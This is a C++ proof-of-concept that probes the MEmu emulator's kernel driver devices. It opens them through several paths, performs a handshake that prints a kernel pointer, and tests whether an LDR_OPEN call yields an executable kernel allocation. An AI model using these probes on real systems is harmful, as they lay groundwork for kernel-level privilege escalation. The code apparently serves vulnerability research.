// poc_memudrv.cpp v3 - probe BOTH devices via all reach paths.
#include <cstdio>
#include "memudrv.h"

static const wchar_t* kPaths[] = {
    MEMU_DEVICE_PATH,                                  // \\.\MEmuDrv (symlink if any)
    MEMU_DEVICE_PATH_U,                                // \\.\MEmuDrvU
    L"\\\\.\\GlobalROOT\\Device\\MEmuDrv",             // direct device namespace
    L"\\\\.\\GlobalROOT\\Device\\MEmuDrvU",
};

int main() {
    for (const wchar_t* p : kPaths) {
        wprintf(L"--- path: %s ---\n", p);
        MemuDrv drv;
        if (!drv.Open(p)) {
            wprintf(L"    open: FAILED err=%lu\n", GetLastError());
            continue;
        }
        wprintf(L"    open: OK (resolved: %s)\n", drv.PathUsed());
        uint64_t sess = 0;
        uint32_t ver = drv.Handshake(&sess);
        if (ver) {
            wprintf(L"    cookie: OK version=0x%X  sessionToken=0x%X  sessionKernelPtr=0x%016llX\n", ver, drv.SessionToken(), sess);
            uint64_t handle = 0; uint8_t ff = 1;
            if (drv.LdrOpenFallbackProbe("probe", handle, ff)) {
                wprintf(L"    LDR_OPEN nonexistent-file: SUCCESS handle=0x%016llX FromFile=%u\n", handle, ff);
                if (!ff) wprintf(L"    ==> exec-alloc fallback CONFIRMED on this device\n");
            } else {
                wprintf(L"    LDR_OPEN probe: failed (err=%lu)\n", GetLastError());
            }
        } else {
            wprintf(L"    cookie: FAILED err=%lu\n", GetLastError());
        }
        drv.Close();
    }
    return 0;
}